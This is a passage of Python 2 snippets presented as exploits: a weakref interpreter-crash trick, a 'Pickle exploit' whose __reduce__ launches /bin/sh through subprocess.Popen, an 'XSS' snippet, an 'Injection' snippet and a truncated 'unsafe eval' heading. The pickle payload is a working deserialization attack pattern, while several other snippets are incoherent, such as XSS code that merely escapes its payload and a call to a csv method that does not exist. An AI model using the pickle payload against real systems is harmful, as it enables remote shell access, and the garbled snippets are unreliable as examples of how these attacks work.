import weakref
class A(object):pass
def callback(x):del lst[0]
keepali0e=[]
lst=[str()]
a=A()
a.c=a
keepali0e.append(weakref.ref(a,callback))
del a
while lst:keepali0e.append(lst[:])
```

Pickle exploit:

```python
import pickle,subprocess
class A(object):
    def __reduce__(self):
        return (subprocess.Popen,(('/bin/sh',),))
print 'z'*0x100,pickle.dumps(A())
```

For XSS:

```python
import cgi,codecs
for c in codecs.getencoder('ascii')('<SCRIPT>alert(/x/)</SCRIPT>'):
    print cgi.escape(chr(c))
```

Injection:

```python
from cStringIO import StringIO
import csv,sys
sys.stdout = StringIO()
csv.writer(sys.stdout,escapechar='\\')._dict_writer({"\\%c"%x:str(x) for x in range(256)})
print 'z'*0x100,sys.stdout.getvalue()
```

For unsafe eval:

```python
import pickle,sub
